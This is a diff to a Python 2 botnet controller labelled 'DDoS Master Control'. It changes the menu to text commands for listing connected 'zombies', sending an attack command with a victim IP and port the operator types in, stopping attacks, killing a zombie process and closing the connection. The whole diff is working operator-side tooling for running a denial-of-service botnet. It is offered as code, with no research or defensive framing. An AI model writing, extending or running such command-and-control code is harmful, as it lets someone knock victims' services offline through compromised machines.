@@ -7,15 +7,16 @@ def printmenu(status):
     print "====== DDoS Master Control ======"
     print "================================="
     print ""
-    print "Choose option [1-4]:"
-    print "List all zombies connected\t[1]"
-    print "Send attack command\t\t[2]"
-    print "Send stop command\t\t[3]"
-    print "Close connection from server\t[4]"
+    print "Commands:"
+    print "List all zombies connected\t[list]"
+    print "Send attack command\t\t[attack]"
+    print "Send stop command\t\t[stop]"
+    print "Kill a zombie process\t\t[kill]"
+    print "Close connection from server\t[die]"
     print ""
     print "========== Status: " + status + " =========="
     print "\n\n--> ",
-    return int(raw_input())
+    return str(raw_input())
 
 def receivemessage(socket):
     data = socket.recv(1024)
@@ -56,21 +57,29 @@ if __name__ == "__main__":
             #Print options menu
             option = printmenu(status)
             #List zombies command
-            if option == 1:
+            if option == "list":
                 s.send("list")
                 receivemessage(s)
             #Start attack command
-            elif option == 2:
-                s.send("attack")
+            elif option == "attack":
+                print "Insert victim ip and port: ",
+                victim = raw_input()
+                s.send("attack " + victim)
                 status = "Attacking!"
                 receivemessage(s)
             #Stop attack command
-            elif option == 3:
+            elif option == "stop":
                 s.send("stop")
                 status = "Attack stopped"
                 receivemessage(s)
+            elif option == "kill":
+                s.send("list")
+                receivemessage(s)
+                print "Insert zombie id to kill: ",
+                zombie_id = raw_input()
+                s.send("kill " + zombie_id)
             #Finish program
-            elif option == 4:
+            elif option == "die":
                 s.send("die")
                 receivemessage(s)
                 alive = 0
